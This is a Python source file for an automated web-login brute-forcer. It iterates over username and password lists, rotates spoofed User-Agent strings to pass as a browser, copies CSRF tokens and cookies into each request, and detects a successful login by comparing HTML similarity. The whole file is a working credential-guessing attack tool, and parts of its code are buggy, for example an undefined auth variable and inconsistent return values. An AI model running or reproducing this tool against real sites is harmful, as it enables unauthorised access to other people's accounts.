import sys
import time
import requests
from bs4 import BeautifulSoup
from lxml import html
from scipy import rand
import ssl
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from html_similarity import style_similarity, structural_similarity, similarity

success = False


def brute(parameters, passwords):
    """
    sends all combinations for usernames and passwords to the attack function on the login page
    """
    # return
    parameters["req_body_type"] = get_req_type(
        parameters["headers"], parameters["req_body"]
    )
    print("up: " + str(parameters["req_body"]))

    for user in parameters["user_list"]:
        user = user.strip()
        user = user.split("\t")
        parameters["username"] = user[0]
        for password in passwords:
            password = password.strip()
            password = password.split("\t")
            parameters["password"] = password[0]
            attack(parameters)


def attack(content):
    """
    create a packet containing fake headers and the payload(username,password) and submit it to the server
    """
    print("[+ action url]: " + str(content["action"]))

    # build packet headers in order to disguise as a browser
    headers = content["headers"]
    headers["User-Agent"] = get_random_user_agent()
    res = requests.get(content["action"])
    soup = BeautifulSoup(res.text, "html.parser")

    payload,cookies = change_cred(
        content["req_body"],
        content["user_param"],
        content["password_param"],
        content["username"],
        content["password"],
        content["req_body_type"],
        soup,
        content["tokens"],
        content['set_cookie'],
        res
    )
    if content['auth_type']:
        if content['auth_type'] == 'basic':
            auth = HTTPBasicAuth(content['username'], content['password'])
        if content['auth_type'] == 'digest':
            auth = HTTPDigestAuth(content['username'], content['password'])
    print("[+ payload]: " + str(payload))

    if content["method"] == "post":
        if content['set_cookie'] == 1:
            resp = requests.post(content["action"], data=payload, cookies=cookies, auth=auth)
        else:
            resp = requests.post(content["action"], data=payload)

    else:
        resp = requests.get(content["action"] + "/" + payload, headers=headers)

    print(
        "[+][attack] trying"
        + " username:"
        + content["username"]
        + " password:"
        + content["password"]
    )
    print(resp.status_code)

    if check_login(resp, res):
        print(
            "login successfull\n\nusername: "
            + content["username"]
            + "\npassword: "
            + content["password"]
        )
        global success
        success = True
        sys.exit(1)


def check_login(content_1, content_2):
    """
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    """
    k = 0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (
        1 - k
    ) * style_similarity(content_1.text, content_2.text)

    if content_1.status_code >= 400:
        return False

    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
        return True

    elif content_1.status_code == 201:
        return True

    else:
        return False


########################################################################################


def get_random_user_agent():
    """generate random user agent to fill in the packet header"""
    import numpy as np

    random_ua = ""
    ua_file = "utils/user_agent.txt"
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0 : len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print("Exception in user agent")
        print(str(ex))
    finally:
        return random_proxy[0 : len(random_proxy) - 2]


def get_req_type(header, req_body):
    type = header["Content-Type"]

    if "json" in type:
        return "JSON"

    elif "xml" in type:
        import xmltodict

        return "XML"

    else:
        import urllib

        return "URL_ENCODED"


def change_cred(
    req_body,
    user_param,
    pass_param,
    username,
    password,
    req_body_type,
    soup,
    dynamic_list,
    set_cookie,
    cookies
):
    if dynamic_list:
        for token in dynamic_list:

            inputs = soup.find("input", {"name": token})
            req_body[token] = inputs["value"]
            
        if set_cookie == 1:
            req_body,cookies = change_cookiesToken(cookies, req_body)
    

    
    req_body[user_param] = username
    req_body[pass_param] = password

    print("\n\n\n\n\n" + str(req_body) + "\n\n\n\n\n")
    if req_body_type == "JSON":
        return req_body

    elif req_body_type == "XML":
        pass

    elif req_body_type == "URL_ENCODED":
        from urllib.parse import urlencode

        return req_body,cookies  # convert from json to encoded

def change_cookiesToken(cookies_jar, req_body):
    cookies = {}
    for cookie in cookies_jar:
        cookies[cookie.name] = cookie.value

    for item in cookies.keys():
        if item[1:] in req_body:
            req_body[item[1:]]= cookies[item]
        if item in req_body:
            req_body[item]= cookies[item]
    if len(cookies) == 0:
        cookies = None
    return req_body,cookies